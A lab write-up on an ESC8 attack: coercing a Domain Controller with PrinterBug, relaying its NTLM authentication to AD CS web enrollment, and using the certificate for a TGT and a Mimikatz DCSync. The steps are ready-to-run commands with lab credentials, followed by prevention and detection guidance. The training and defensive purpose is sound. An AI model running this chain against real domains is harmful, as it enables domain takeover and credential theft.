# 🧪 Skills Assessment

## 📖 Description

Following up on the PKI-related attack scenario from the previous section, another attack we can abuse is relaying to ADCS to obtain a certificate, a technique known as ESC8.

Previously, we used PrinterBug and Coercer to make (or force) computers to connect to any other computer. In this scenario, we will utilize the PrinterBug, and with the received reverse connection, we will relay to ADCS to obtain a certificate for the machine we coerced.

---

## 🔴 Attack

We begin by configuring NTLMRelayx to forward incoming connections to the HTTP endpoint of our Certificate Authority. As part of this configuration, we will specify that we want to obtain a certificate for the Domain Controller (a default template in AD, which Domain Controllers use for client authentication). The --adcs switch makes NTLMRelayx parse and displays the certificate if one is received:

```shellsession
@htb[/htb]$ impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs
```

<img width="732" height="496" alt="image" src="https://github.com/user-attachments/assets/6ee31d64-055a-4c91-8606-e0b81e575e14" />

<img width="1638" height="680" alt="image" src="https://github.com/user-attachments/assets/d7e54838-051d-4717-8669-dde935fee976" />

Now we need to get the Domain Controller to connect to us. We’ll use the Print Spooler bug and force a reverse connection to us (as we previously did in a previous lab). In this case, we are forcing DC2 to connect to the Kali machine while we have NTLMRelayx listening in another terminal:

```shellsession
@htb[/htb]$ python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
```

<img width="732" height="238" alt="image" src="https://github.com/user-attachments/assets/42bbd53c-d64f-4b51-a4f9-59bad1611260" />

<img width="1614" height="267" alt="image" src="https://github.com/user-attachments/assets/4eeb0ab4-5e20-4d3a-bfc5-871e1c302a5d" />

If we switch back to terminal of NTLMRelayx, we will see that an incoming request from DC2$ was relayed and a certificate was successfully obtained:

<img width="1813" height="556" alt="image" src="https://github.com/user-attachments/assets/52c45cac-3200-4596-aa26-169cb7654309" />

We will copy the obtained base64-encoded certificate, switch to the Windows machine, and use Rubeus to the certificate to authenticate with (this time, the certificate is in the proper format) and obtain a TGT:

```powershell
.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQIBAzCCEScGCSqGSI<SNIP>
```

<img width="771" height="778" alt="image" src="https://github.com/user-attachments/assets/ed397082-5a41-42cc-9677-f82d791b0656" />

<img width="1829" height="1489" alt="image" src="https://github.com/user-attachments/assets/45a51186-29c4-42e3-9877-7c51bf346eff" />

We have now obtained a TGT for the Domain Controller DC2. Therefore we become DC2. Being a Domain Controller, we can now trigger DCSync with Mimikatz:

```powershell
.\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
```

<img width="667" height="850" alt="image" src="https://github.com/user-attachments/assets/858a5856-6f7b-42d1-af82-5fd77f076009" />

<img width="2067" height="1728" alt="image" src="https://github.com/user-attachments/assets/6553dad2-1ee8-49c8-ace5-5ca81ad321af" />

---

## 🛡️ Prevention

The above attack was possible because:

* We managed to coerce DC2 successfully
* ADCS web enrollment does not enforce HTTPS (otherwise, relaying would fail, and we won't request a certificate)
* Because there are many different PKI-related escalation techniques, it is highly advised to regularly scan the environment with Certify or other similar tools to find potential issues.

In addition, AD CS web enrollment should be configured to use HTTPS and certificate-based protections should be reviewed to reduce the ability to relay NTLM authentication to the certificate authority.

Organizations should also reduce or disable unnecessary NTLM authentication and regularly review AD CS certificate templates and enrollment permissions for unintended authentication paths.

---

## 🔎 Detection

This attack provides multiple techniques for detection. If we start from the part where a certificate is requested by NTLMRelayx, we will see that the CA has flagged both the request and the issuer of the certificate in events ID 4886 and 4887, respectively:

<img width="900" height="460" alt="image" src="https://github.com/user-attachments/assets/91898dc2-583f-47fc-9657-bf6cbedda3ae" />

<img width="1084" height="579" alt="image" src="https://github.com/user-attachments/assets/37321241-0f30-4743-ba15-e1b42f424dc0" />

What stands out is that the template name is mentioned as part of the request; however, it isn't if requested by the Domain Controller itself (not relaying). There may be some exceptions to this in an environment; thus, it is best to check if it could be used as an indicator of flagging, coercing/relaying attacks to ADCS.

Subsequently, in the attack, we utilized the obtained certificate to get a Kerberos TGT, which resulted in the event ID 4768:

<img width="1251" height="1075" alt="image" src="https://github.com/user-attachments/assets/20a6fa30-ec1f-4884-84e1-805ee6f269eb" />

It stands out that XX is attempting to log in with a certificate, and the IP address is not the DC's.

Finally, when we used Mimikatz to perform DCSync, we will see the event ID 4624 that indicates XX authenticated successfully from another IP address and not it is own:

<img width="1375" height="1317" alt="image" src="https://github.com/user-attachments/assets/41ab26ae-4cd3-48aa-89ab-9739a06cfa0c" />

---

## 🔑 Key Takeaway

**Skills Assessment** demonstrates an ESC8 attack, where NTLM authentication from a coerced Domain Controller is relayed to AD CS to obtain a certificate for that machine.

The key security lesson is that **coercion, NTLM relay, and vulnerable AD CS web enrollment can be chained together**. A certificate obtained through this chain can then be used for Kerberos authentication and further domain compromise.
